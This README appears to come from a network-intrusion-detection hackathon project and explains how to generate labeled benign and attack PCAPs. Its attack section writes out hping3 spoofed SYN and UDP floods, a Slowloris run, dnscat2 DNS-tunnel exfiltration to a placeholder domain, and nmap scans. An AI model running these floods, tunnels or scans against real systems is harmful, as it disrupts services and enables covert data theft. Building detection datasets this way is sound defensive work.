# Data Generation & Lab Tooling Guide — NTRO SIH 26145

This directory provides both **self-contained automated PCAP generators** (`benign_traffic_gen.py` and `attack_traffic_gen.py`) and standard operating procedures for generating lab traffic using the external tools specified in the NTRO Problem Statement.

---

## 1. Automated Synthetic Generation (Zero Dependencies)

To generate all 8 labeled PCAPs (2 benign + 6 attack classes) with ground-truth sidecar JSON files, simply run:

```bash
# Generate Benign PCAPs (steady + bursty web/DNS/NTP)
python data_generation/benign_traffic_gen.py

# Generate all 6 Attack PCAPs matching NTRO threat classes
python data_generation/attack_traffic_gen.py
```

Generated files in `data_generation/pcaps/`:
- `benign_steady.pcap` + `benign_steady.json`
- `benign_bursty.pcap` + `benign_bursty.json`
- `attack_ddos_syn.pcap` + `attack_ddos_syn.json` (Threat a: SYN flood & spoofed source)
- `attack_c2_beacon.pcap` + `attack_c2_beacon.json` (Threat b: Botnet C2 beaconing)
- `attack_dga.pcap` + `attack_dga.json` (Threat c: DGA & DNS tunneling)
- `attack_encrypted_malware.pcap` + `attack_encrypted_malware.json` (Threat d: Encrypted malware / JA3)
- `attack_portscan.pcap` + `attack_portscan.json` (Threat e: Reconnaissance / Port scanning)
- `attack_exfil.pcap` + `attack_exfil.json` (Threat f: Asymmetric data exfiltration)

---

## 2. Standard Lab Tooling (Per NTRO Problem Statement)

When executing in a dedicated hardware lab with physical hardware taps or DPDK/TRex generators, use the commands below.

### A. Benign Load Generators

#### 1. `iperf3` (Controlled TCP/UDP throughput)
```bash
# Target Server
iperf3 -s -p 5201

# Client (Simulating steady 100 Mbps TCP load)
iperf3 -c <server_ip> -p 5201 -b 100M -t 60

# Client (Simulating bursty UDP baseline)
iperf3 -c <server_ip> -u -b 50M -l 1400 -t 30
```

#### 2. `TRex` (High-Speed Stateful & Stateless Traffic Engine)
```bash
# Start TRex server on dual 10G/40G interfaces
sudo ./t-rex-64 -i -c 4

# Run enterprise traffic profile (HTTP, HTTPS, DNS, Mail)
./trex-console
> start -f cap2/dns.yaml -m 10kpps
> start -f cap2/https.yaml -m 50kpps
```

#### 3. `Ostinato` (Custom Packet Crafting GUI/CLI)
```bash
# Use Ostinato drone for custom multi-stream IP traffic injection
ostinato-drone -v
```

---

### B. Attack Traffic Tools

#### 1. `hping3` (Volumetric SYN & UDP Floods — Threat a)
```bash
# SYN Flood with randomized source IP spoofing (DDoS)
sudo hping3 -S --flood --rand-source -p 80 <target_ip>

# UDP Amplification / Flood
sudo hping3 --udp --flood --rand-source -p 53 <target_ip>
```

#### 2. `Slowloris` (Slow HTTP Resource Exhaustion — Threat a/d)
```bash
# Establishes hundreds of slow HTTP connections with keep-alive headers
python3 -m pip install slowloris
slowloris <target_web_server> -s 500
```

#### 3. `dnscat2` & `iodine` (DNS Tunnelling & Exfiltration — Threat c)
```bash
# dnscat2 server (Authoritative DNS listener)
ruby dnscat2.rb --dns domain=tunnel.example.com --no-cache

# dnscat2 client (Covert exfiltration over TXT queries)
./dnscat --dns domain=tunnel.example.com --secret=pass
```

#### 4. `DGArchive` / Domain Generation Algorithms (Threat c)
```bash
# Replaying verified DGA seeds (e.g. Conficker, Matsnu, Necurs)
python3 -c "
import random, string
# Simulating Matsnu DGA domain stream
for i in range(100):
    name = ''.join(random.choices(string.ascii_lowercase, k=16)) + '.com'
    print(name)
"
```

#### 5. `nmap` (Reconnaissance and Port Scanning — Threat e)
```bash
# Vertical SYN Stealth Scan across all ports
sudo nmap -sS -p 1-65535 -T4 <target_ip>

# Horizontal Subnet Sweep
sudo nmap -sS -p 445 192.168.1.0/24
```

---

## 3. Ground Truth Data Schema

Every `.pcap` generated has an accompanying `.json` file containing:
- Threat class (`a_volumetric_ddos` to `f_data_exfiltration` or `benign`)
- Key flow identifiers (`client_ip`, `victim_ip`, `ports`, `protocols`)
- Expected feature signatures (expected entropy thresholds, expected IAT CV, expected JA3 digests)
- Person 3's ML evaluation scripts read these JSON files directly to compute ROC-AUC, confusion matrices, and F1-scores.
